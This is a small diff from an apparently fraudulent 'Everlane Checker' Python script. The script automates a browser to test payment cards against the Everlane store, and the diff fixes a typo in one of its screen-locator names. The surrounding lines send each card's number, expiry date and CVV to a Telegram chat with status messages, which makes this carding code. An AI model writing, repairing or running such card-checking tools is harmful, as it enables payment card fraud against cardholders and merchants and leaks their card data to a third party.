@@ -203,7 +203,7 @@ def livear(cc_namso):
     elif bot.locate('out_funds', click=False):
         print('Your card appears to be out of funds. Please try a new one.')
         telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]} CVV: {cc[3]}\n\n📝 Details:\nYour card appears to be out of funds. Please try a new one.", '-726102881')
-    elif bot.locate('enable_to_ad', click=False):
+    elif bot.locate('enable_to_add', click=False):
         print("Unable to add payment method. Please try again.")
         telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]} CVV: {cc[3]}\n\n📝 Details:\nUnable to add payment method. Please try again.", '-726102881')
         preparar_worksplace()
